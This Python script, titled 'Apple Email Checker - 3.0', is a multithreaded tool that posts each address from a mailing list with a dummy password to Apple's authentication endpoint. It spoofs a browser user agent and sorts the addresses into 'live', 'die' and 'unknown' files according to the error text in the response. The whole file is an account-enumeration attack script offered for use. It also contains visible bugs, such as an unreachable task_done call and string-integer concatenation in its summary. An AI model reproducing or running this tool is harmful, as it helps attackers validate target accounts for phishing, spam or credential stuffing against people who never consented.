import requests
import time
import threading
import queue
from datetime import datetime


class Apple():
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'
    die = 'Your Apple ID or password was entered incorrectly.'.encode()
    inputQueue = queue.Queue()

    def __init__(self):

        print(r"""
 ,_,
(O,O)	Apple Email Checker - 3.0
(   )	mukhlis@slackerc0de.us
-"-"--
		""")

        self.mailist = input("Mailing list file names ? ")
        self.thread = input("How many threads ? ")
        self.countList = len(list(open(self.mailist)))
        self.clean = input("Clean rezult folder ? (y/n) ")
        if self.clean == 'y':
            self.clean_rezult()
        print('')

    def save_to_file(self, nameFile, x):
        kl = open(nameFile, 'a+')
        kl.write(x)
        kl.close()

    def clean_rezult(self):
        open('rezult/live.txt', 'w').close()
        open('rezult/die.txt', 'w').close()
        open('rezult/unknown.txt', 'w').close()

    def post_email(self, eml):
        try:
            r = requests.post('https://idmsac.apple.com/authenticate',
                              params={
                                  'accountPassword': 'xxxxxx',
                                  'appleId': eml,
                                  'appIdKey': 'c991a1687d72e54d35d951a58cf7aa33fe722353b48f89d27c1ea2ffa08a4b80'
                              },
                              headers={'User-Agent': self.ua}
                              )
            if self.die in r.content:
                return 'die'
            else:
                return 'live'
        except:
            return 'unknown'

    def chk(self):

        while 1:
            eml = self.inputQueue.get()
            rez = self.post_email(eml)
            time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            if rez == 'die':
                print('[+] '+time+' - DIE - '+eml +
                      ' - [Apple Email Checker - 3.0]')
                self.save_to_file('rezult/die.txt', eml+'\n')

            elif rez == 'live':
                print('[+] '+time+' - LIVE - '+eml +
                      ' - [Apple Email Checker - 3.0]')
                self.save_to_file('rezult/live.txt', eml+'\n')

            elif rez == 'unknown':
                print('[+] '+time+' - UNKNOWN - '+eml +
                      ' - [Apple Email Checker - 3.0]')
                self.save_to_file('rezult/unknown.txt', eml+'\n')

            else:
                print('contact coder')

        self.inputQueue.task_done()

    def run_thread(self):
        self.startTime = time.time()
        for x in range(int(self.thread)):
            t = threading.Thread(target=self.chk)
            t.setDaemon(True)
            t.start()
        for y in open(self.mailist, 'r').readlines():
            self.inputQueue.put(y.strip())
        self.inputQueue.join()

    def finish(self):
        print('')
        print('Checking '+self.countList+' emails has been completed perfectly in ' +
              time.time() - self.startTime+'seconds')
        print('')
        print('Live    : ', len(list(open('rezult/live.txt'))), 'emails')
        print('Die     : ', len(list(open('rezult/die.txt'))), 'emails')
        print('Unknown : ', len(list(open('rezult/unknown.txt'))), 'emails')
        print('')


heh = Apple()
heh.run_thread()
heh.finish()
